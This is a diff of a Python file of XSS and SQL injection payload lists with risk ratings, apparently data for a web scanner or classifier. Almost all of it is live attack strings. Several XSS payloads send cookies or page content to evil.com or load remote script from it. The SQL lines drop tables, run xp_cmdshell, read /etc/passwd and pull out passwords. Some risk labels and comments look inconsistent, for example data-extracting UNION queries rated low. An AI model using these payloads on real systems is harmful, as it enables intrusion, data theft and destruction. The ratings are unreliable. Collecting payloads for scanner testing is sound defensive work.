@@ -1,404 +1,229 @@
 # XSS Payloads
 XSS_PAYLOADS = [
-    {"payload": "<img src='x' onerror='alert(1)'>", "risk": "high"},
-    {"payload": "<body onload=alert(1)>", "risk": "high"},
-    {"payload": "<iframe id=x onblur=alert(1)></iframe><input autofocus>", "risk": "medium"},
-    {"payload": "<input onblur=alert(1) id=x><input autofocus>", "risk": "medium"},
-    {"payload": "<textarea onblur=alert(1) id=x></textarea><input autofocus>", "risk": "medium"},
-    {"payload": "<select onblur=alert(1) id=x></select><input autofocus>", "risk": "medium"},
-    {"payload": "<p><script>/* Bad stuff here... */</script></p>", "risk": "high"},
-    {"payload": "<p>This post was extremely helpful.</p>", "risk": "low"},
-    {"payload": "<a autofocus onfocus=alert(1) href></a>", "risk": "medium"},
-    {"payload": "<a autofocus onfocusin=alert(1) href></a>", "risk": "medium"},
-    {"payload": "<a id=x tabindex=1 onfocus=alert(1)></a>", "risk": "medium"},
-    {"payload": "<a id=x tabindex=1 onfocusin=alert(1)></a>", "risk": "medium"},
-    {"payload": "<a onafterscriptexecute=alert(1)><script>1</script>", "risk": "high"},
-    {"payload": "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>", "risk": "medium"},
-    {"payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", "risk": "high"},
-    {"payload": "<details open ontoggle=alert(1)></details>", "risk": "high"},
-    {"payload": "<video><source onerror=\"alert(1)\"></video>", "risk": "high"},
-    {"payload": "<<script>><<alert>(1)//<</script>>", "risk": "high"},
-    {"payload": "<input type='text' name='username'>", "risk": "low"},
-    {"payload": "<div class='message'>Welcome back!</div>", "risk": "low"},
-    {"payload": "<a href='https://example.com'>Click here</a>", "risk": "low"},
-    {"payload": "<img src='logo.png' alt='Logo'>", "risk": "low"},
-    {"payload": "<strong>This is bold text</strong>", "risk": "low"},
-    {"payload": "<em>Italic text</em>", "risk": "low"},
-    {"payload": "<script>console.log('hello')</script>", "risk": "low"},
-    {"payload": "<ul><li>Item 1</li><li>Item 2</li></ul>", "risk": "low"},
-    {"payload": "<button type='submit'>Submit</button>", "risk": "low"},
-    {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "risk": "high"},
-    {"payload": "<iframe src='javascript:alert(1)'></iframe>", "risk": "high"},
-    {"payload": "<script>eval(String.fromCharCode(88,83,83))</script>", "risk": "high"},
-    {"payload": "<script>eval('alert(1)')</script>", "risk": "high"},
-    {"payload": "<script>window.onload=alert(1)</script>", "risk": "high"},
-    {"payload": "<a href='javascript:alert(1)'>Click Here</a>", "risk": "medium"},
-    {"payload": "<button onfocus='alert(1)'>Click Me</button>", "risk": "medium"},
-    {"payload": "<textarea onfocus='alert(1)'></textarea>", "risk": "medium"},
-    {"payload": "<a onmouseover='alert(1)'>Hover Me</a>", "risk": "medium"},
-    {"payload": "<svg onload='alert(1)'></svg>", "risk": "high"},
-    {"payload": "<input type='image' src='x' onerror='alert(1)'>", "risk": "high"},
-    {"payload": "<form onsubmit='alert(1)'><input type='submit'></form>", "risk": "low"},
-    {"payload": "<img \"\"\"><script>alert(1)</script>", "risk": "high"},
-    {"payload": "<script>alert`1`</script>", "risk": "high"},
-    {"payload": "<script>throw onerror=alert;'XSS'</script>", "risk": "high"},
-    {"payload": "<style><img src='x' onerror='alert(1)'></style>", "risk": "high"},
-    {"payload": "<input type='search' onsearch='alert(1)'>", "risk": "medium"},
-    {"payload": "<marquee onstart='alert(1)'>Hello</marquee>", "risk": "medium"},
-    {"payload": "<select onchange='alert(1)'><option>Test</option></select>", "risk": "medium"},
-    {"payload": "<body onunload='alert(1)'>", "risk": "high"},
-    {"payload": "<iframe onload='alert(1)'></iframe>", "risk": "high"},
-    {"payload": "javascript:alert('XSS')", "risk": "low"},
-    {"payload": "<p><strong>Not sanitized</strong></p>", "risk": "low"},
-    {"payload": "<img src='x' alt='XSS'>", "risk": "low"},
-    {"payload": "<b onmousedown=alert('XSS')>Click</b>", "risk": "low"},
-    {"payload": "'><img src=x onerror=alert('XSS')>", "risk": "high"},
-    {"payload": "<svg/onload=eval('alert(1)')>", "risk": "high"},
-    {"payload": "<input type='text' onfocus='eval(1)'>", "risk": "high"},
-    {"payload": "<body onload='eval(1)'>", "risk": "high"},
-    {"payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>", "risk": "high"},
-    {"payload": "<script>setTimeout(function() { alert(1); }, 500);</script>", "risk": "medium"},
-    {"payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "risk": "high"},
-    {"payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "risk": "high"},
-    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},
-    {"payload": "<body onbeforeunload='alert(1)'>", "risk": "high"},
-    {"payload": "<a href='javascript:void(0)' onclick='alert(1)'>Click me</a>", "risk": "medium"},
-    {"payload": "<svg><script>alert(1)</script></svg>", "risk": "high"},
-    {"payload": "<audio onerror='alert(1)'><source src='x'></audio>", "risk": "high"},
-    {"payload": "<div style='background-image: url(javascript:alert(1))'>XSS</div>", "risk": "high"},
-    {"payload": "<input type='file' onfocus='alert(1)'>", "risk": "medium"},
-    {"payload": "<button onclick='eval(1)'>Click</button>", "risk": "high"},
-    {"payload": "<script>document.location='https://evil.com?cookie='+document.cookie</script>", "risk": "high"},
-    {"payload": "<input type='text' onkeypress='alert(1)'>", "risk": "medium"},
-    {"payload": "<div onmouseover='alert(1)'>Hover</div>", "risk": "medium"},
-    {"payload": "<script src='https://evil.com/xss.js'></script>", "risk": "high"},
-    {"payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<embed src='javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<object data='javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<base href='https://evil.com/'>", "risk": "medium"},
-    {"payload": "<script>eval(location.hash.substr(1))</script>", "risk": "high"},
-    {"payload": "<img src='x' onmouseover='alert(1)'>", "risk": "medium"},
-    {"payload": "<script>fetch('https://evil.com?data='+document.cookie)</script>", "risk": "high"},
-    {"payload": "<input type='text' onpaste='alert(1)'>", "risk": "medium"},
-    {"payload": "<div onclick='alert(1)'>Click</div>", "risk": "medium"},
-    {"payload": "<script>new Image().src='https://evil.com?x='+document.body.innerHTML</script>", "risk": "high"},
-    {"payload": "<link rel='stylesheet' href='javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<script>onerror=alert;throw 1</script>", "risk": "high"},
-    {"payload": "<area href='javascript:alert(1)'>", "risk": "medium"},
-    {"payload": "<script>history.pushState({},'','?x=alert(1)')</script>", "risk": "medium"},
-    {"payload": "<dialog open onclose='alert(1)'>Test</dialog>", "risk": "high"},
-    {"payload": "<script>window.name='alert(1)';location=window.name</script>", "risk": "high"},
-    {"payload": "<script>XMLHttpRequest().open('GET','https://evil.com?x='+encodeURIComponent(document.cookie)).send()</script>", "risk": "high"},
-    {"payload": "<input type='text' oncut='alert(1)'>", "risk": "medium"},
-    {"payload": "<style>@import'javascript:alert(1)';</style>", "risk": "high"},
-    {"payload": "<script>alert(document.domain)</script>", "risk": "high"},
-    {"payload": "<map><area href='javascript:alert(1)'></map>", "risk": "medium"},
-    {"payload": "<script>eval('al'+'ert(1)')</script>", "risk": "high"},
-    {"payload": "<details onmouseover='alert(1)'>Test</details>", "risk": "medium"},
-    {"payload": "<picture><source onerror='alert(1)'></picture>", "risk": "high"},
-    {"payload": "<script>document.createElement('script').src='https://evil.com/x.js'</script>", "risk": "high"},
-    {"payload": "<meta http-equiv='Content-Security-Policy' content='script-src javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<script>window.location='https://evil.com?x='+btoa(document.cookie)</script>", "risk": "high"},
-    {"payload": "<input type='text' onselect='alert(1)'>", "risk": "medium"},
-    {"payload": "<script>sessionStorage.setItem('x','alert(1)');eval(sessionStorage.getItem('x'))</script>", "risk": "high"},
-    {"payload": "<style>body{background:url('javascript:alert(1)')}</style>", "risk": "high"},
-    {"payload": "<script>document.forms[0].action='https://evil.com';document.forms[0].submit()</script>", "risk": "high"},
-    {"payload": "<video onloadedmetadata='alert(1)'><source src='x'></video>", "risk": "high"},
-    {"payload": "<script>window.onhashchange=()=>{alert(1)}</script>", "risk": "medium"},
-    {"payload": "<base href='javascript:alert(1)//'>", "risk": "high"},
-    {"payload": "<script>navigator.sendBeacon('https://evil.com',document.cookie)</script>", "risk": "high"},
-    {"payload": "<keygen onfocus='alert(1)'>", "risk": "medium"},
-    {"payload": "<script>document.cookie='test='+document.cookie</script>", "risk": "high"},
-    {"payload": "<div oncontextmenu='alert(1)'>Right-click</div>", "risk": "medium"},
-    {"payload": "<script>Function('alert(1)')()</script>", "risk": "high"},
-    {"payload": "<math><mi onmouseover='alert(1)'>XSS</mi></math>", "risk": "medium"},
-    {"payload": "<isindex action='javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "risk": "high"},
-    {"payload": "<form><button formaction='javascript:alert(1)'>Click</button></form>", "risk": "high"},
-    {"payload": "<script>new Function('alert(1)')()</script>", "risk": "high"},
-    {"payload": "<div style='xss:expression(alert(1))'>XSS</div>", "risk": "high"},
-    {"payload": "<img src='javascript:alert(1)'>", "risk": "high"},
-    {"payload": "<script>prompt('XSS')</script>", "risk": "high"},
-    {"payload": "<div onkeyup='alert(1)'>", "risk": "medium"},
-    {"payload": "<input type='text' oninput='alert(1)'>", "risk": "medium"},
-    {"payload": "<details onopen='alert(1)'>Test</details>", "risk": "medium"},
-    {"payload": "<script>fetch('https://evil.com?x='+encodeURI(document.location))</script>", "risk": "high"},
-    {"payload": "<input type='text' ondragstart='alert(1)'>", "risk": "medium"},
-    {"payload": "<script>document.write('<script src=https://evil.com/xss.js></script>')</script>", "risk": "high"},
-    {"payload": "<div onpointerover='alert(1)'>Hover</div>", "risk": "medium"},
-    {"payload": "<script>new EventSource('https://evil.com?x='+document.cookie)</script>", "risk": "high"},
-    {"payload": "<input type='text' oncopy='alert(1)'>", "risk": "medium"},
-    {"payload": "<script>eval(decodeURI(location.hash.slice(1)))</script>", "risk": "high"}
+    {"payload": "<img src='x' onerror='alert(1)'>", "risk": "high"},  # Classic XSS using an image with an error handler
+    {"payload": "<body onload=alert(1)>", "risk": "high"},  # XSS triggered by the body onload event
+    {"payload": "<iframe id=x onblur=alert(1)></iframe><input autofocus>", "risk": "medium"},  # XSS triggered by onblur event in an iframe
+    {"payload": "<input onblur=alert(1) id=x><input autofocus>", "risk": "medium"},  # XSS via input field onblur event
+    {"payload": "<textarea onblur=alert(1) id=x></textarea><input autofocus>", "risk": "medium"},  # XSS with textarea onblur event
+    {"payload": "<select onblur=alert(1) id=x></select><input autofocus>", "risk": "medium"},  # XSS with select onblur event
+    {"payload": "<p><script>/* Bad stuff here... */</script></p>", "risk": "high"},  # Script injection in a paragraph
+    {"payload": "<p>This post was extremely helpful.</p>", "risk": "low"},  # Non-malicious content for testing
+    {"payload": "<a autofocus onfocus=alert(1) href></a>", "risk": "medium"},  # XSS triggered by onfocus event in anchor
+    {"payload": "<a autofocus onfocusin=alert(1) href></a>", "risk": "medium"},  # XSS using onfocusin event in anchor
+    {"payload": "<a id=x tabindex=1 onfocus=alert(1)></a>", "risk": "medium"},  # XSS using onfocus event with tabindex
+    {"payload": "<a id=x tabindex=1 onfocusin=alert(1)></a>", "risk": "medium"},  # XSS triggered by onfocusin event with tabindex
+    {"payload": "<a onafterscriptexecute=alert(1)><script>1</script>", "risk": "high"},  # XSS triggered by script execution after event
+    {"payload": "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>", "risk": "medium"},  # XSS triggered on copy event in editable content
+    {"payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", "risk": "high"},  # XSS using iframe with srcdoc
+    {"payload": "<details open ontoggle=alert(1)></details>", "risk": "high"},  # XSS triggered by toggling details element
+    {"payload": "<video><source onerror=\"alert(1)\"></video>", "risk": "high"},  # XSS triggered by video source error
+    {"payload": "<<script>><<alert>(1)//<</script>>", "risk": "high"},  # Malformed script tag injection
+    {"payload": "<input type='text' name='username'>", "risk": "low"},  # Non-malicious input field
+    {"payload": "<div class='message'>Welcome back!</div>", "risk": "low"},  # Non-malicious message content
+    {"payload": "<a href='https://example.com'>Click here</a>", "risk": "low"},  # Non-malicious link
+    {"payload": "<img src='logo.png' alt='Logo'>", "risk": "low"},  # Non-malicious image
+    {"payload": "<strong>This is bold text</strong>", "risk": "low"},  # Non-malicious bold text
+    {"payload": "<em>Italic text</em>", "risk": "low"},  # Non-malicious italic text
+    {"payload": "<script>console.log('hello')</script>", "risk": "low"},  # Low-risk XSS with console log
+    {"payload": "<ul><li>Item 1</li><li>Item 2</li></ul>", "risk": "low"},  # Non-malicious list
+    {"payload": "<button type='submit'>Submit</button>", "risk": "low"},  # Non-malicious button
+    {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "risk": "high"},  # XSS using SVG animation onbegin event
+    {"payload": "<iframe src='javascript:alert(1)'></iframe>", "risk": "high"},  # XSS triggered by iframe with javascript URL
+    {"payload": "<script>eval(String.fromCharCode(88,83,83))</script>", "risk": "high"},  # XSS with eval using encoded string
+    {"payload": "<script>eval('alert(1)')</script>", "risk": "high"},  # XSS using eval() for executing alert
+    {"payload": "<script>window.onload=alert(1)</script>", "risk": "high"},  # XSS triggered by window.onload event
+    {"payload": "<a href='javascript:alert(1)'>Click Here</a>", "risk": "medium"},  # XSS triggered by onclick event in link
+    {"payload": "<button onfocus='alert(1)'>Click Me</button>", "risk": "medium"},  # XSS triggered by onfocus event in button
+    {"payload": "<textarea onfocus='alert(1)'></textarea>", "risk": "medium"},  # XSS using onfocus event in textarea
+    {"payload": "<a onmouseover='alert(1)'>Hover Me</a>", "risk": "medium"},  # XSS triggered by onmouseover event in link
+    {"payload": "<svg onload='alert(1)'></svg>", "risk": "high"},  # XSS using onload event in SVG
+    {"payload": "<input type='image' src='x' onerror='alert(1)'>", "risk": "high"},  # XSS triggered by error event in input image
+    {"payload": "<form onsubmit='alert(1)'><input type='submit'></form>", "risk": "low"},  # Non-malicious form with submit input
+    {"payload": "<img \"\"\"><script>alert(1)</script>", "risk": "high"},  # Malformed image tag with script injection
+    {"payload": "<script>alert`1`</script>", "risk": "high"},  # XSS with template literals in script tag
+    {"payload": "<script>throw onerror=alert;'XSS'</script>", "risk": "high"},  # XSS triggered by error handling
+    {"payload": "<style><img src='x' onerror='alert(1)'></style>", "risk": "high"},  # XSS triggered by image error in style
+    {"payload": "<input type='search' onsearch='alert(1)'>", "risk": "medium"},  # XSS using onsearch event in input
+    {"payload": "<marquee onstart='alert(1)'>Hello</marquee>", "risk": "medium"},  # XSS triggered by onstart event in marquee
+    {"payload": "<select onchange='alert(1)'><option>Test</option></select>", "risk": "medium"},  # XSS triggered by onchange event in select
+    {"payload": "<body onunload='alert(1)'>", "risk": "high"},  # XSS triggered by onunload event in body
+    {"payload": "<iframe onload='alert(1)'></iframe>", "risk": "high"},  # XSS using iframe onload event
+    {"payload": "javascript:alert('XSS')", "risk": "low"},  # Low-risk XSS with JavaScript URL
+    {"payload": "<p><strong>Not sanitized</strong></p>", "risk": "low"},  # Non-malicious content testing sanitization
+    {"payload": "<img src='x' alt='XSS'>", "risk": "low"},  # Non-malicious image tag for testing
+    {"payload": "<b onmousedown=alert('XSS')>Click</b>", "risk": "low"},  # XSS triggered by onmousedown event in bold tag
+    {"payload": "'><img src=x onerror=alert('XSS')>", "risk": "high"},  # XSS using unescaped quotes in input fields
+    {"payload": "<svg/onload=eval('alert(1)')>", "risk": "high"},  # XSS using SVG with eval() in onload event
+    {"payload": "<input type='text' onfocus='eval(1)'>", "risk": "high"},  # XSS triggered by eval() in input onfocus event
+    {"payload": "<body onload='eval(1)'>", "risk": "high"},  # XSS triggered by eval() on body load
+    {"payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>", "risk": "high"},  # XSS with base64 encoded script in object tag
+    {"payload": "<script>setTimeout(function() { alert(1); }, 500);</script>", "risk": "medium"},  # XSS using setTimeout to delay execution
+    {"payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "risk": "high"},  # XSS via document.write
+    {"payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "risk": "high"},  # XSS using iframe with inline script
+    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},  # XSS using onfocus event in input
+    {"payload": "<body onbeforeunload='alert(1)'>", "risk": "high"},  # XSS triggered by onbeforeunload event in body
+    {"payload": "<a href='javascript:void(0)' onclick='alert(1)'>Click me</a>", "risk": "medium"},  # XSS triggered by onclick event in link
+    {"payload": "<svg><script>alert(1)</script></svg>", "risk": "high"},  # XSS triggered by script inside SVG tag
+    {"payload": "<audio onerror='alert(1)'><source src='x'></audio>", "risk": "high"},  # XSS triggered by audio source error
+    {"payload": "<div style='background-image: url(javascript:alert(1))'>XSS</div>", "risk": "high"},  # XSS triggered by background-image using JavaScript URL
+    {"payload": "<input type='file' onfocus='alert(1)'>", "risk": "medium"},  # XSS using onfocus event in file input
+    {"payload": "<button onclick='eval(1)'>Click</button>", "risk": "high"},  # XSS triggered by eval() in button onclick event
+    {"payload": "<script>document.location='https://evil.com?cookie='+document.cookie</script>", "risk": "high"},  # XSS stealing cookies via document.location
+    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},  # XSS triggered by onfocus event in text input
+    {"payload": "<img src=x onerror=eval('alert(1)')>", "risk": "high"},  # XSS triggered by image error with eval()
 ]
+
 
 # SQL Injection Payloads
 SQLI_PAYLOADS = [
-    {"payload": "' OR '1'='1", "risk": "high"},
-    {"payload": "' OR 1=1 -- ", "risk": "high"},
-    {"payload": "' OR 1=1#", "risk": "high"},
-    {"payload": "' OR 1=1/*", "risk": "high"},
-    {"payload": "' OR '1'='1' /*", "risk": "high"},
-    {"payload": "' OR ''='", "risk": "high"},
-    {"payload": "' OR 1=1 LIMIT 1; -- ", "risk": "high"},
-    {"payload": "' UNION SELECT NULL, NULL, NULL -- ", "risk": "high"},
-    {"payload": "' UNION SELECT username, password FROM users -- ", "risk": "high"},
-    {"payload": "admin' -- ", "risk": "high"},
-    {"payload": "admin' #", "risk": "high"},
-    {"payload": "admin'/*", "risk": "high"},
-    {"payload": "' OR 1=1 ORDER BY 1 -- ", "risk": "high"},
-    {"payload": "' OR EXISTS(SELECT * FROM users) -- ", "risk": "high"},
-    {"payload": "' AND 1=1 -- ", "risk": "high"},
-    {"payload": "' AND 1=2 -- ", "risk": "medium"},
-    {"payload": "' AND username IS NOT NULL; -- ", "risk": "medium"},
-    {"payload": "' AND (SELECT COUNT(*) FROM users) > 0 -- ", "risk": "medium"},
-    {"payload": "1' AND SLEEP(5) -- ", "risk": "high"},
-    {"payload": "1 AND 1=1", "risk": "low"},
-    {"payload": "1 AND 1=2", "risk": "low"},
-    {"payload": "admin' AND 1=1 -- ", "risk": "low"},
-    {"payload": "admin' AND 1=2 -- ", "risk": "low"},
-    {"payload": "'; EXEC xp_cmdshell('dir'); -- ", "risk": "high"},
-    {"payload": "' OR '1'='1' AND ''='", "risk": "high"},
-    {"payload": "' AND (SELECT SUBSTRING(@@version,1,1)) = '5", "risk": "medium"},
-    {"payload": "' AND ASCII(SUBSTRING((SELECT @@version),1,1))=53 -- ", "risk": "medium"},
-    {"payload": "' OR 1=CONVERT(int, 'test') -- ", "risk": "high"},
-    {"payload": "' OR 1=1; DROP TABLE users -- ", "risk": "high"},
-    {"payload": "1'; DROP TABLE users --", "risk": "high"},
-    {"payload": "1 OR 1=1#", "risk": "high"},
-    {"payload": "' OR 'x'='x", "risk": "high"},
-    {"payload": "OR 1=1", "risk": "high"},
-    {"payload": "\" OR \"\" = \"", "risk": "high"},
-    {"payload": "' OR sleep(10)--", "risk": "high"},
-    {"payload": "' OR benchmark(1000000,MD5(1))--", "risk": "high"},
-    {"payload": "'||(SELECT password FROM users LIMIT 1)||'", "risk": "high"},
-    {"payload": "';WAITFOR DELAY '0:0:10'--", "risk": "high"},
-    {"payload": "' AND 1=CAST((CHR(113)||CHR(107)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC)--", "risk": "high"},
-    {"payload": "' UNION SELECT 1,2,3--", "risk": "high"},
-    {"payload": "' UNION SELECT null, username, password FROM users--", "risk": "high"},
-    {"payload": "' AND '1'='1", "risk": "medium"},
-    {"payload": "' UNION SELECT username, password, email FROM users -- ", "risk": "high"},
-    {"payload": "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') -- ", "risk": "high"},
-    {"payload": "' AND SUBSTRING(@@version, 1, 1) = 5 --", "risk": "medium"},
-    {"payload": "'; DROP DATABASE test --", "risk": "high"},
-    {"payload": "' AND password LIKE '%admin%' --", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT * FROM users --", "risk": "high"},
-    {"payload": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --", "risk": "high"},
-    {"payload": "'; SHOW TABLES --", "risk": "medium"},
-    {"payload": "1'AND1=1UNSELECTnull,username,passwordFROMusers--", "risk": "high"},
-    {"payload": "1'ORsleep(5)--", "risk": "high"},
-    {"payload": "';DROPTABLEusers;--", "risk": "high"},
-    {"payload": "admin'UNSELECTnull,passwordFROMusers--", "risk": "high"},
-    {"payload": "';EXECxp_cmdshell('dir');--", "risk": "high"},
-    {"payload": "1'AND1=1ORDERBY1--", "risk": "medium"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, version() -- ", "risk": "high"},
-    {"payload": "1' AND IF(1=1, SLEEP(5), 0) -- ", "risk": "high"},
-    {"payload": "1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ", "risk": "medium"},
-    {"payload": "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM pg_sleep(5)) -- ", "risk": "high"},
-    {"payload": "1' OR '1'='1' LIMIT 1 OFFSET 0 -- ", "risk": "high"},
-    {"payload": "1' AND EXISTS(SELECT * FROM sysobjects) -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; EXEC sp_helpdb; -- ", "risk": "high"},
-    {"payload": "{\"$ne\":null}", "risk": "high"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, database() -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM users WHERE 1=1 LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT current_user(); -- ", "risk": "high"},
-    {"payload": "1' AND LENGTH((SELECT password FROM users LIMIT 1))=8 -- ", "risk": "high"},
-    {"payload": "1' OR 1=1; SELECT table_name FROM information_schema.tables -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM mysql.user LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT schema_name FROM information_schema.schemata -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM dual WHERE 1=1) -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT user FROM sys.user_users -- ", "risk": "high"},
-    {"payload": "{\"$gt\": \"\"}", "risk": "high"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, @@servername -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.columns WHERE table_name='users' LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT @@basedir; -- ", "risk": "high"},
-    {"payload": "1' AND SUBSTRING((SELECT user FROM users LIMIT 1),1,1)='a' -- ", "risk": "high"},
-    {"payload": "1' OR 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM pg_catalog.pg_tables WHERE tablename='users')=1 -- ", "risk": "medium"},
-    {"payload": "1' AND (SELECT 1 FROM sys.tables WHERE name='users')=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT name FROM sys.databases -- ", "risk": "high"},
-    {"payload": "{\"$in\":[]}", "risk": "high"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, current_database() -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.tables WHERE table_schema='public' LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT @@innodb_data_home_dir; -- ", "risk": "high"},
-    {"payload": "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97 -- ", "risk": "high"},
-    {"payload": "1' OR 1=1; SELECT group_concat(table_name) FROM information_schema.tables -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM sys.sysdatabases WHERE name='master')=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT dbms_utility.db_version FROM dual -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.processlist LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "1' OR 1=1; SELECT userenv('SESSION_USER') FROM dual -- ", "risk": "high"},
-    {"payload": "{\"$regex\":\".*\"}", "risk": "high"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, @@hostname -- ", "risk": "high"},
-    {"payload": "' OR LENGTH(database())=5 -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM pg_stat_activity LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "' OR 1=1; SELECT @@datadir; -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.schemata LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "' OR 1=1; SELECT current_schema(); -- ", "risk": "high"},
-    {"payload": "1' AND BINARY 'a'='A' -- ", "risk": "medium"},
-    {"payload": "1' AND (SELECT 1 FROM v$session LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "' OR 1=1; SELECT user FROM dual -- ", "risk": "high"},
-    {"payload": "1' AND 1=1 UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT @@version_compile_os; -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1 -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT load_file('/etc/passwd') -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM users WHERE username='admin' AND substring(password,1,1)='a')=1 -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT @@secure_file_priv; -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users' AND table_schema!='mysql')=1 -- ", "risk": "medium"},
-    {"payload": "' OR 1=1; SELECT extractvalue(1,concat(0x7e,(SELECT @@version))) -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT group_concat(username) FROM users -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM information_schema.columns WHERE column_name='password' LIMIT 1)=1 -- ", "risk": "medium"},
-    {"payload": "' OR 1=1; SELECT @@global.secure_file_priv; -- ", "risk": "high"},
-    {"payload": "1' AND (SELECT 1 FROM users WHERE username='admin' AND password REGEXP '^[0-9]')=1 -- ", "risk": "high"},
-    {"payload": "' OR 1=1; SELECT concat_ws(':',username,password) FROM users LIMIT 1 -- ", "risk": "high"}
+    # High Risk Payloads (Can lead to full system compromise, data exfiltration, or control)
+    {"payload": "' OR '1'='1", "risk": "high"},  # Common boolean-based SQLi to bypass login
+    {"payload": "' OR 1=1 -- ", "risk": "high"},  # SQLi to bypass login, comments out the rest of the query
+    {"payload": "' UNION SELECT NULL, NULL, NULL -- ", "risk": "high"},  # Union-based SQLi to extract data
+    {"payload": "' UNION SELECT username, password FROM users -- ", "risk": "high"},  # Extract sensitive data
+    {"payload": "' OR 1=1 LIMIT 1; -- ", "risk": "high"},  # SQLi with LIMIT clause to fetch data
+    {"payload": "admin' -- ", "risk": "high"},  # Login bypass, specific to admin account
+    {"payload": "' OR 'x'='x", "risk": "high"},  # Always true condition to bypass authentication
+    {"payload": "1' AND 1=1 UNION SELECT NULL, version() -- ", "risk": "low"},  # Retrieve DB version
+    {"payload": "1' AND 1=1 UNION SELECT NULL, current_user() -- ", "risk": "low"},  # Get current user
+    {"payload": "1' AND 1=1 UNION SELECT NULL, current_schema() -- ", "risk": "low"},  # Get current schema
+    {"payload": "1' AND 1=1 UNION SELECT NULL, @@hostname -- ", "risk": "low"},  # Get DB server hostname
+    {"payload": "' AND LENGTH((SELECT password FROM users LIMIT 1))=8 -- ", "risk": "low"},  # Test password length
+    {"payload": "1' AND (SELECT 1 FROM information_schema.processlist LIMIT 1)=1 -- ", "risk": "low"},  # Process list query in MySQL
+    {"payload": "' OR 1=1; SELECT current_user(); -- ", "risk": "low"},  # Get current user with SQLi
+    {"payload": "' OR sleep(10)--", "risk": "high"},  # Time-based SQLi (blind), induces delay
+    {"payload": "' OR benchmark(1000000,MD5(1))--", "risk": "high"},  # Benchmark-based SQLi, test for server delay
+    {"payload": "' OR 1=1; SELECT database() -- ", "risk": "high"},  # Get the current database name
+    {"payload": "' AND 1=2 -- ", "risk": "medium"},  # Commonly used to test for vulnerability, no effect
+    {"payload": "' AND (SELECT COUNT(*) FROM users) > 0 -- ", "risk": "medium"},  # Checks if there are any users in the database
+    {"payload": "' AND username IS NOT NULL; -- ", "risk": "medium"},  # Check if 'username' column exists
+    {"payload": "' AND (SELECT SUBSTRING(@@version,1,1)) = '5", "risk": "medium"},  # Check for a specific database version
